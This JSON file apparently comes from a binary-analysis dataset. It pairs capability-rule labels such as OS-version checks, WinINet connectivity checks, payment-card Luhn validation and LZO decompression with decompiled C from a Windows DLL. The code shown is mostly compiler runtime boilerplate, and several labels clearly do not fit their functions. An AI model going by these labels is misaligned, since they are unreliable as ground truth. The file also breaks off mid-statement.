{
    "6bac1010": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.6bac1010(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    bool bVar3;\n    uint64_t *puVar4;\n    int32_t *piVar5;\n    ulong uVar6;\n    code *pcVar7;\n    ulong uVar8;\n    int64_t in_GS_OFFSET;\n    \n    pcVar7 = _sym.imp.KERNEL32.dll_Sleep;\n    puVar4 = *0x6bb07280;\n    if (arg2 == 0) {\n        uVar8 = 0;\n        if (0 < *0x6bb0a018) {\n            *0x6bb0a018 = *0x6bb0a018 + -1;\n            while( true ) {\n                LOCK();\n                uVar1 = *puVar4;\n                *puVar4 = *puVar4 ^ (uVar1 == 0) * (*puVar4 ^ 1);\n                piVar5 = *0x6bb07290;\n                if ((uVar1 != 0) * *puVar4 == 0) break;\n                (*pcVar7)(1000);\n            }\n            if (**0x6bb07290 == 2) {\n                fcn.6bac2d00(0x6bb0a000);\n                *piVar5 = 0;\n                *puVar4 = 0;\n                uVar8 = 1;\n            }\n            else {\n                sub.msvcrt.dll__amsg_exit(0x1f);\n                uVar8 = 1;\n            }\n        }\n        return uVar8;\n    }\n    if (arg2 != 1) {\n        return 1;\n    }\n    uVar1 = *(*(in_GS_OFFSET + 0x30) + 8);\n    do {\n        LOCK();\n        uVar2 = *puVar4;\n        *puVar4 = *puVar4 ^ (uVar2 == 0) * (*puVar4 ^ uVar1);\n        uVar6 = *0x6bb072d0;\n        uVar8 = *0x6bb072c0;\n        piVar5 = *0x6bb07290;\n        uVar2 = (uVar2 != 0) * *puVar4;\n        if (uVar2 == 0) {\n            bVar3 = false;\ncode_r0x6bac10ef:\n            if (**0x6bb07290 == 1) {\n                sub.msvcrt.dll__amsg_exit(0x1f);\n            }\n            else if (**0x6bb07290 == 0) {\n                **0x6bb07290 = 1;\n                sub.msvcrt.dll__initterm(uVar8, uVar6);\n            }\n            if (*piVar5 == 1) {\n                sub.msvcrt.dll__initterm(*0x6bb072a0, *0x6bb072b0);\n                *piVar5 = 2;\n            }\n            if (!bVar3) {\n                *puVar4 = 0;\n            }\n            if (**0x6bb07250 != NULL) {\n                (***0x6bb07250)(arg1, 2, arg3);\n            }\n            *0x6bb0a018 = *0x6bb0a018 + 1;\n            return 1;\n        }\n        if (uVar1 == uVar2) {\n            bVar3 = true;\n            goto code_r0x6bac10ef;\n        }\n        (*pcVar7)(1000);\n    } while( true );\n}\n",
        "token_count": 793
    },
    "null": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "6bac2670": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.6bac2670(ulong noname_0, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg2 == 2) {\n        fcn.6bac2b30();\n        return 1;\n    }\n    if (arg2 < 3) {\n        if (arg2 == 0) {\n            if (*0x6bb0a8a8 != 0) {\n                fcn.6bac24f0();\n            }\n            iVar2 = *0x6bb0a8a0;\n            if (*0x6bb0a8a8 == 1) {\n                while (iVar2 != 0) {\n                    iVar1 = *(iVar2 + 0x10);\n                    sub.msvcrt.dll_free(iVar2);\n                    iVar2 = iVar1;\n                }\n                *0x6bb0a8a0 = 0;\n                *0x6bb0a8a8 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x6bb0a8c0);\n            }\n        }\n        else {\n            if (*0x6bb0a8a8 == 0) {\n                (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x6bb0a8c0);\n            }\n            *0x6bb0a8a8 = 1;\n        }\n    }\n    else if ((arg2 == 3) && (*0x6bb0a8a8 != 0)) {\n        fcn.6bac24f0();\n    }\n    return 1;\n}\n",
        "token_count": 351
    },
    "6bac1840": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x6bac2cdb)\n\nint32_t fcn.6bac1840(void)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    code **ppcVar7;\n    \n    if (*0x6bb0a020 != 0) {\n        return *0x6bb0a020;\n    }\n    *0x6bb0a020 = 1;\n    uVar2 = **0x6bb07220;\n    if (uVar2 == 0xffffffff) {\n        uVar4 = 0;\n        do {\n            uVar2 = uVar4;\n            uVar4 = uVar2 + 1;\n        } while ((*0x6bb07220)[uVar4] != 0);\n    }\n    if (uVar2 != 0) {\n        ppcVar7 = *0x6bb07220 + uVar2;\n        ppcVar1 = *0x6bb07220 + (uVar2 - (uVar2 - 1)) + -1;\n        do {\n            (**ppcVar7)();\n            ppcVar7 = ppcVar7 + -1;\n        } while (ppcVar7 != ppcVar1);\n    }\n    sub.msvcrt.dll__lock(8);\n    if (*0x6bb0a000 == NULL) {\n        *0x6bb0a000 = sub.msvcrt.dll_calloc(0x20, 8);\n        if (*0x6bb0a000 != NULL) {\n            *0x6bb0a010 = *0x6bb0a000 + 0x20;\n            *0x6bb0a008 = *0x6bb0a000;\n            goto code_r0x6bac2c4f;\n        }\ncode_r0x6bac2ce2:\n        sub.msvcrt.dll__unlock(8);\n        iVar3 = -1;\n    }\n    else {\ncode_r0x6bac2c4f:\n        if (*0x6bb0a010 == *0x6bb0a008) {\n            iVar5 = *0x6bb0a008 - *0x6bb0a000;\n            puVar6 = sub.msvcrt.dll_realloc();\n            if (puVar6 == NULL) goto code_r0x6bac2ce2;\n            *0x6bb0a010 = puVar6 + (iVar5 >> 3) * 2;\n            *0x6bb0a008 = puVar6 + iVar5;\n            *0x6bb0a000 = puVar6;\n        }\n        puVar6 = *0x6bb0a008 + 1;\n        **0x6bb0a008 = 0x6bac1790;\n        *0x6bb0a008 = puVar6;\n        sub.msvcrt.dll__unlock(8);\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 678
    },
    "6bac16c3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.6bac16c3(int64_t arg1)\n\n{\n    if ((0 < *0x6bac302c) && (0 < *0x6bac3030)) {\n        *(arg1 + *0x6bac302c) = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        *(arg1 + *0x6bac3030) = _sym.imp.KERNEL32.dll_GetProcAddress;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "6bac1d90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.6bac1d90(ulong param_1, ulong param_2, uint64_t param_3, int64_t param_4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int32_t *in_RAX;\n    int64_t iVar8;\n    int32_t *piVar9;\n    uint64_t uVar10;\n    code *pcVar11;\n    int64_t *arg1;\n    char *pcVar12;\n    uint32_t uVar13;\n    int64_t *piVar14;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    int32_t iVar17;\n    ulong auStack168 [5];\n    ulong auStack128 [4];\n    ulong var_58h;\n    uchar auStack88 [8];\n    uint64_t var_48h;\n    \n    iVar17 = *0x6bb0a5e0;\n    if (*0x6bb0a5e0 != 0) {\n        return in_RAX;\n    }\n    *0x6bb0a5e0 = 1;\n    auStack128[0] = 0x6bac1dd7;\n    fcn.6bac2910();\n    auStack128[0] = 0x6bac1dee;\n    iVar8 = fcn.6bac2b40(param_1);\n    iVar16 = *0x6bb07260;\n    puVar1 = *0x6bb07230;\n    *0x6bb0a5e4 = 0;\n    iVar8 = -iVar8;\n    *0x6bb0a5e8 = &stack0xffffffffffffffa8 + iVar8;\n    piVar9 = *0x6bb07230 - *0x6bb07240;\n    if (piVar9 < 8) {\n        *0x6bb0a5e4 = 0;\n        return piVar9;\n    }\n    uVar13 = **0x6bb07240;\n    puVar15 = *0x6bb07240;\n    if (piVar9 < 0xc) {\ncode_r0x6bac1e2d:\n        if (uVar13 == 0) {\n            piVar9 = puVar15[1];\ncode_r0x6bac1e38:\n            if (piVar9 == 0) {\n                uVar10 = puVar15[2];\n                if (puVar15[2] != 1) {\ncode_r0x6bac2068:\n                    pcVar12 = \"  Unknown pseudo relocation protocol version %d.\\n\";\n                    *(&stack0xffffffffffffff80 + iVar8) = 0x6bac2074;\n                    fcn.6bac1b10(\"  Unknown pseudo relocation protocol version %d.\\n\", uVar10, param_3, param_4);\n                    uVar13 = *pcVar12;\n                    if (0xc0000096 < uVar13) {\n                        return 0x1;\n                    }\n                    if (0xc000008b < uVar13) {\n    // switch table (10 cases) at 0x6bb071b0\n                        switch(uVar13) {\n                        case 0xc000008d:\n                        case 0xc000008e:\n                        case 0xc000008f:\n                        case 0xc0000090:\n                        case 0xc0000091:\n                        case 0xc0000093:\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac20be;\n                            pcVar11 = sub.msvcrt.dll_signal(8, 0);\n                            if (pcVar11 != 0x1) goto code_r0x6bac216d;\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac20d7;\n                            sub.msvcrt.dll_signal(8, 1);\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac20dc;\n                            fcn.6bac2b30();\n                        default:\n                            return NULL;\n                        case 0xc0000094:\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac2163;\n                            pcVar11 = sub.msvcrt.dll_signal(8, 0);\n                            if (pcVar11 == 0x1) {\n                                *(&stack0xffffffffffffff58 + iVar8) = 0x6bac220f;\n                                sub.msvcrt.dll_signal(8, 1);\n                                return NULL;\n                            }\ncode_r0x6bac216d:\n                            if (pcVar11 != NULL) {\n                                *(&stack0xffffffffffffff58 + iVar8) = 0x6bac2183;\n                                (*pcVar11)(8);\n                                return NULL;\n                            }\n                            return 0x1;\n                        case 0xc0000096:\n                            goto code_r0x6bac2112;\n                        }\n                    }\n                    if (uVar13 == 0xc0000005) {\n                        *(&stack0xffffffffffffff58 + iVar8) = 0x6bac219c;\n                        pcVar11 = sub.msvcrt.dll_signal(0xb, 0);\n                        if (pcVar11 == 0x1) {\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac222f;\n                            sub.msvcrt.dll_signal(0xb, 1);\n                            return NULL;\n                        }\n                        if (pcVar11 != NULL) {\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac21ae;\n                            (*pcVar11)(0xb);\n                            return NULL;\n                        }\n                    }\n                    else {\n                        if (uVar13 < 0xc0000006) {\n                            return uVar13 != 0x80000002;\n                        }\n                        if (uVar13 == 0xc0000008) {\n                            return NULL;\n                        }\n                        if (uVar13 != 0xc000001d) {\n                            return 0x1;\n                        }\ncode_r0x6bac2112:\n                        *(&stack0xffffffffffffff58 + iVar8) = 0x6bac211e;\n                        pcVar11 = sub.msvcrt.dll_signal(4, 0);\n                        if (pcVar11 == 0x1) {\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac21ef;\n                            sub.msvcrt.dll_signal(4, 1);\n                            return NULL;\n                        }\n                        if (pcVar11 != NULL) {\n                            *(&stack0xffffffffffffff58 + iVar8) = 0x6bac2138;\n                            (*pcVar11)(4);\n                            return NULL;\n                        }\n                    }\n                    return 0x4;\n                }\n                puVar15 = puVar15 + 3;\n                if (*0x6bb07230 <= puVar15) {\n                    *0x6bb0a5e4 = 0;\n                    return piVar9;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar15 + 2);\n                        param_3 = uVar2;\n                        piVar14 = *puVar15 + iVar16;\n                        arg1 = puVar15[1] + iVar16;\n                        param_4 = *piVar14;\n                        if (uVar2 != 0x20) break;\n                        uVar13 = *arg1;\n                        uVar10 = uVar13 | 0xffffffff00000000;\n                        if (-1 < uVar13) {\n                            uVar10 = uVar13;\n                        }\n                        var_48h = (uVar10 - piVar14) + param_4;\n                        *(&stack0xffffffffffffff80 + iVar8) = 0x6bac1ffa;\n                        fcn.6bac1b80(arg1, &fcn.6bac1d90::var_48h, 4);\ncode_r0x6bac1ea0:\n                        puVar15 = puVar15 + 3;\n                        if (puVar1 <= puVar15) goto code_r0x6bac1f20;\n                    }\n                    uVar13 = uVar2;\n                    if (0x20 < uVar2) {\n                        if (uVar13 == 0x40) {\n                            var_48h = (*arg1 - piVar14) + param_4;\n                            *(&stack0xffffffffffffff80 + iVar8) = 0x6bac1fc8;\n                            fcn.6bac1b80(arg1, &fcn.6bac1d90::var_48h, 8);\n                            goto code_r0x6bac1ea0;\n                        }\ncode_r0x6bac2051:\n                        uVar10 = uVar13;\n                        var_48h = 0;\n                        *(&stack0xffffffffffffff80 + iVar8) = 0x6bac2068;\n                        fcn.6bac1b10(\"  Unknown pseudo relocation bit size %d.\\n\", uVar10, param_3, param_4);\n                        goto code_r0x6bac2068;\n                    }\n                    if (uVar13 == 8) {\n                        uVar2 = *arg1;\n                        uVar10 = uVar2;\n                        if (uVar2 < '\\0') {\n                            uVar10 = uVar2 | 0xffffffffffffff00;\n                        }\n                        var_48h = (uVar10 - piVar14) + param_4;\n                        *(&stack0xffffffffffffff80 + iVar8) = 0x6bac1ea0;\n                        fcn.6bac1b80(arg1, &fcn.6bac1d90::var_48h, 1);\n                        goto code_r0x6bac1ea0;\n                    }\n                    if (uVar13 != 0x10) goto code_r0x6bac2051;\n                    uVar3 = *arg1;\n                    uVar10 = uVar3;\n                    if (uVar3 < 0) {\n                        uVar10 = uVar3 | 0xffffffffffff0000;\n                    }\n                    puVar15 = puVar15 + 3;\n                    var_48h = (uVar10 - piVar14) + param_4;\n                    *(&stack0xffffffffffffff80 + iVar8) = 0x6bac1f11;\n                    fcn.6bac1b80(arg1, &fcn.6bac1d90::var_48h, 2);\n                } while (puVar15 < puVar1);\n                goto code_r0x6bac1f20;\n            }\n        }\n    }\n    else if (uVar13 == 0) {\n        piVar9 = (*0x6bb07240)[1];\n        if (((*0x6bb07240)[1] | (*0x6bb07240)[2]) == 0) {\n            uVar13 = (*0x6bb07240)[3];\n            puVar15 = *0x6bb07240 + 3;\n            goto code_r0x6bac1e2d;\n        }\n        goto code_r0x6bac1e38;\n    }\n    if (*0x6bb07230 <= puVar15) {\n        *0x6bb0a5e4 = 0;\n        return piVar9;\n    }\n    puVar1 = puVar15 + (*0x6bb07230 + (-1 - puVar15) & 0xfffffffffffffff8U) + 8;\n    do {\n        uVar13 = puVar15[1];\n        uVar5 = *puVar15;\n        puVar15 = puVar15 + 2;\n        var_48h = var_48h & 0xffffffff00000000 | uVar5 + *(uVar13 + iVar16);\n        *(&stack0xffffffffffffff80 + iVar8) = 0x6bac2047;\n        fcn.6bac1b80(uVar13 + iVar16, &fcn.6bac1d90::var_48h, 4);\n    } while (puVar15 != puVar1);\ncode_r0x6bac1f20:\n    pcVar11 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    piVar9 = *0x6bb0a5e4;\n    if (0 < *0x6bb0a5e4) {\n        iVar16 = 0;\n        do {\n            piVar9 = *0x6bb0a5e8 + iVar16;\n            iVar4 = *piVar9;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar9 + 4);\n                uVar7 = *(piVar9 + 2);\n                *(&stack0xffffffffffffff80 + iVar8) = 0x6bac1f60;\n                piVar9 = (*pcVar11)(uVar7, uVar6, iVar4, &fcn.6bac1d90::var_48h);\n            }\n            iVar17 = iVar17 + 1;\n            iVar16 = iVar16 + 0x28;\n        } while (iVar17 < *0x6bb0a5e4);\n    }\n    return piVar9;\n}\n",
        "token_count": 2890
    },
    "6bac1860": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.6bac1860(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    \n    uStack56 = 0;\n    if (*0x6bb06ca0 != 0x2b992ddfa232) {\n        *0x6bb06cb0 = ~*0x6bb06ca0;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack56);\n    uVar1 = uStack56;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&uStack48);\n    *0x6bb06ca0 = (uVar4 ^ uVar3 ^ uVar2 ^ uVar1 ^ uStack48) & 0xffffffffffff;\n    if (*0x6bb06ca0 == 0x2b992ddfa232) {\n        *0x6bb06cb0 = 0xffffd466d2205dcc;\n        *0x6bb06ca0 = 0x2b992ddfa233;\n    }\n    else {\n        *0x6bb06cb0 = ~*0x6bb06ca0;\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "6bac1b80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint8_t ** fcn.6bac1b80(ulong *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    int64_t iVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    code *pcVar13;\n    int32_t iVar14;\n    char *pcVar15;\n    int64_t *arg1_00;\n    uint64_t arg2_00;\n    int64_t *piVar16;\n    uint32_t *puVar17;\n    uint64_t uVar18;\n    int64_t in_R9;\n    ulong auStack288 [5];\n    ulong auStack248 [5];\n    uchar auStack208 [8];\n    uchar *apuStack200 [2];\n    uint64_t uStack184;\n    ulong *puStack176;\n    int64_t iStack168;\n    ulong *puStack160;\n    ulong auStack88 [3];\n    ulong uStack64;\n    uint32_t uStack52;\n    \n    iStack168 = *0x6bb0a5e4;\n    uVar18 = arg3;\n    if (*0x6bb0a5e4 < 1) goto code_r0x6bac1d28;\n    iVar14 = 0;\n    ppuVar9 = *0x6bb0a5e8 + 0x18;\n    do {\n        if ((*ppuVar9 <= arg1) && (uVar18 = *(ppuVar9[1] + 8),  arg1 < *ppuVar9 + uVar18)) goto code_r0x6bac1c57;\n        iVar14 = iVar14 + 1;\n        ppuVar9 = ppuVar9 + 5;\n    } while (iVar14 != *0x6bb0a5e4);\n    while (iVar10 = fcn.6bac2880(arg1),  iVar10 != 0) {\n        iStack168 = iStack168 * 0x28;\n        puVar11 = *0x6bb0a5e8 + iStack168;\n        *(puVar11 + 8) = iVar10;\n        *puVar11 = 0;\n        iVar12 = fcn.6bac29b0();\n        iVar12 = *(iVar10 + 0xc) + iVar12;\n        *(*0x6bb0a5e8 + iStack168 + 0x18) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, auStack88, 0x30);\n        if (iVar12 == 0) goto code_r0x6bac1d71;\n        ppuVar9 = uStack52;\n        if (((uStack52 - 0x40 & 0xffffffbf) == 0) || (uVar7 = uStack52 - 4 & 0xfffffffb,  ppuVar9 = uVar7,  uVar7 == 0))\n        {\ncode_r0x6bac1c50:\n            *0x6bb0a5e4 = *0x6bb0a5e4 + 1;\ncode_r0x6bac1c57:\n            uVar7 = arg3;\n            if (uVar7 < 8) {\n                if ((arg3 & 4) == 0) {\n                    if (uVar7 != 0) {\n                        ppuVar9 = *arg2;\n                        *arg1 = *arg2;\n                        if ((arg3 & 2) != 0) {\n                            uVar3 = *(arg2 + ((arg3 & 0xffffffff) - 2));\n                            ppuVar9 = uVar3;\n                            *(arg1 + ((arg3 & 0xffffffff) - 2)) = uVar3;\n                        }\n                    }\n                }\n                else {\n                    *arg1 = *arg2;\n                    uVar7 = *(arg2 + ((arg3 & 0xffffffff) - 4));\n                    ppuVar9 = uVar7;\n                    *(arg1 + ((arg3 & 0xffffffff) - 4)) = uVar7;\n                }\n            }\n            else {\n                *arg1 = *arg2;\n                ppuVar9 = arg3 & 0xffffffff;\n                *(arg1 + -1 + ppuVar9) = *(arg2 + -1 + ppuVar9);\n                iVar10 = arg1 - (arg1 + 1 & 0xfffffffffffffff8);\n                uVar7 = uVar7 + iVar10 & 0xfffffff8;\n                if (7 < uVar7) {\n                    ppuVar9 = NULL;\n                    do {\n                        uVar8 = ppuVar9 + 8;\n                        *((arg1 + 1 & 0xfffffffffffffff8) + ppuVar9) = *((arg2 - iVar10) + ppuVar9);\n                        ppuVar9 = uVar8;\n                    } while (uVar8 < uVar7);\n                    return uVar8;\n                }\n            }\n            return ppuVar9;\n        }\n        uVar18 = 0x40;\n        in_R9 = *0x6bb0a5e8 + iStack168;\n        *(in_R9 + 8) = auStack88[0];\n        *(in_R9 + 0x10) = uStack64;\n        ppuVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (ppuVar9 != 0) goto code_r0x6bac1c50;\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.6bac1b10(\"  VirtualProtect failed with code 0x%x\", uVar7, uVar18, in_R9);\ncode_r0x6bac1d28:\n        iStack168 = 0;\n    }\n    fcn.6bac1b10(\"Address %p has no image-section\", arg1, uVar18, in_R9);\ncode_r0x6bac1d71:\n    pcVar15 = \"  VirtualQuery failed for %d bytes at address %p\";\n    uVar18 = *(*0x6bb0a5e8 + iStack168 + 0x18);\n    ppuVar9 = fcn.6bac1b10(\"  VirtualQuery failed for %d bytes at address %p\", *(iVar10 + 8), uVar18, in_R9);\n    iVar14 = *0x6bb0a5e0;\n    if (*0x6bb0a5e0 != 0) {\n        return ppuVar9;\n    }\n    *0x6bb0a5e0 = 1;\n    auStack248[0] = 0x6bac1dd7;\n    uStack184 = arg3;\n    puStack176 = arg2;\n    puStack160 = arg1;\n    fcn.6bac2910();\n    auStack248[0] = 0x6bac1dee;\n    iVar10 = fcn.6bac2b40(pcVar15);\n    iVar12 = *0x6bb07260;\n    puVar1 = *0x6bb07230;\n    *0x6bb0a5e4 = 0;\n    iVar10 = -iVar10;\n    *0x6bb0a5e8 = auStack208 + iVar10;\n    ppuVar9 = *0x6bb07230 - *0x6bb07240;\n    if (ppuVar9 < 8) {\n        *0x6bb0a5e4 = 0;\n        return ppuVar9;\n    }\n    uVar7 = **0x6bb07240;\n    puVar17 = *0x6bb07240;\n    if (ppuVar9 < 0xc) {\ncode_r0x6bac1e2d:\n        if (uVar7 == 0) {\n            ppuVar9 = puVar17[1];\ncode_r0x6bac1e38:\n            if (ppuVar9 == 0) {\n                arg2_00 = puVar17[2];\n                if (puVar17[2] != 1) {\ncode_r0x6bac2068:\n                    pcVar15 = \"  Unknown pseudo relocation protocol version %d.\\n\";\n                    *(auStack248 + iVar10) = 0x6bac2074;\n                    fcn.6bac1b10(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2_00, uVar18, in_R9);\n                    uVar7 = *pcVar15;\n                    if (0xc0000096 < uVar7) {\n                        return 0x1;\n                    }\n                    if (0xc000008b < uVar7) {\n                        switch(uVar7) {\n                        case 0xc000008d:\n                        case 0xc000008e:\n                        case 0xc000008f:\n                        case 0xc0000090:\n                        case 0xc0000091:\n                        case 0xc0000093:\n                            *(auStack288 + iVar10) = 0x6bac20be;\n                            pcVar13 = sub.msvcrt.dll_signal(8, 0);\n                            if (pcVar13 != 0x1) goto code_r0x6bac216d;\n                            *(auStack288 + iVar10) = 0x6bac20d7;\n                            sub.msvcrt.dll_signal(8, 1);\n                            *(auStack288 + iVar10) = 0x6bac20dc;\n                            fcn.6bac2b30();\n                        default:\n                            return NULL;\n                        case 0xc0000094:\n                            *(auStack288 + iVar10) = 0x6bac2163;\n                            pcVar13 = sub.msvcrt.dll_signal(8, 0);\n                            if (pcVar13 == 0x1) {\n                                *(auStack288 + iVar10) = 0x6bac220f;\n                                sub.msvcrt.dll_signal(8, 1);\n                                return NULL;\n                            }\ncode_r0x6bac216d:\n                            if (pcVar13 != NULL) {\n                                *(auStack288 + iVar10) = 0x6bac2183;\n                                (*pcVar13)(8);\n                                return NULL;\n                            }\n                            return 0x1;\n                        case 0xc0000096:\n                            goto code_r0x6bac2112;\n                        }\n                    }\n                    if (uVar7 == 0xc0000005) {\n                        *(auStack288 + iVar10) = 0x6bac219c;\n                        pcVar13 = sub.msvcrt.dll_signal(0xb, 0);\n                        if (pcVar13 == 0x1) {\n                            *(auStack288 + iVar10) = 0x6bac222f;\n                            sub.msvcrt.dll_signal(0xb, 1);\n                            return NULL;\n                        }\n                        if (pcVar13 != NULL) {\n                            *(auStack288 + iVar10) = 0x6bac21ae;\n                            (*pcVar13)(0xb);\n                            return NULL;\n                        }\n                    }\n                    else {\n                        if (uVar7 < 0xc0000006) {\n                            return uVar7 != 0x80000002;\n                        }\n                        if (uVar7 == 0xc0000008) {\n                            return NULL;\n                        }\n                        if (uVar7 != 0xc000001d) {\n                            return 0x1;\n                        }\ncode_r0x6bac2112:\n                        *(auStack288 + iVar10) = 0x6bac211e;\n                        pcVar13 = sub.msvcrt.dll_signal(4, 0);\n                        if (pcVar13 == 0x1) {\n                            *(auStack288 + iVar10) = 0x6bac21ef;\n                            sub.msvcrt.dll_signal(4, 1);\n                            return NULL;\n                        }\n                        if (pcVar13 != NULL) {\n                            *(auStack288 + iVar10) = 0x6bac2138;\n                            (*pcVar13)(4);\n                            return NULL;\n                        }\n                    }\n                    return 0x4;\n                }\n                puVar17 = puVar17 + 3;\n                if (*0x6bb07230 <= puVar17) {\n                    *0x6bb0a5e4 = 0;\n                    return ppuVar9;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar17 + 2);\n                        uVar18 = uVar2;\n                        piVar16 = *puVar17 + iVar12;\n                        arg1_00 = puVar17[1] + iVar12;\n                        in_R9 = *piVar16;\n                        if (uVar2 != 0x20) break;\n                        uVar7 = *arg1_00;\n                        uVar18 = uVar7 | 0xffffffff00000000;\n                        if (-1 < uVar7) {\n                            uVar18 = uVar7;\n                        }\n                        apuStack200[0] = in_R9 + (uVar18 - piVar16);\n                        *(auStack248 + iVar10) = 0x6bac1ffa;\n                        fcn.6bac1b80(arg1_00, apuStack200, 4);\ncode_r0x6bac1ea0:\n                        puVar17 = puVar17 + 3;\n                        if (puVar1 <= puVar17) goto code_r0x6bac1f20;\n                    }\n                    uVar7 = uVar2;\n                    if (0x20 < uVar2) {\n                        if (uVar7 == 0x40) {\n                            apuStack200[0] = in_R9 + (*arg1_00 - piVar16);\n                            *(auStack248 + iVar10) = 0x6bac1fc8;\n                            fcn.6bac1b80(arg1_00, apuStack200, 8);\n                            goto code_r0x6bac1ea0;\n                        }\ncode_r0x6bac2051:\n                        arg2_00 = uVar7;\n                        apuStack200[0] = NULL;\n                        *(auStack248 + iVar10) = 0x6bac2068;\n                        fcn.6bac1b10(\"  Unknown pseudo relocation bit size %d.\\n\", arg2_00, uVar18, in_R9);\n                        goto code_r0x6bac2068;\n                    }\n                    if (uVar7 == 8) {\n                        uVar2 = *arg1_00;\n                        uVar18 = uVar2;\n                        if (uVar2 < '\\0') {\n                            uVar18 = uVar2 | 0xffffffffffffff00;\n                        }\n                        apuStack200[0] = 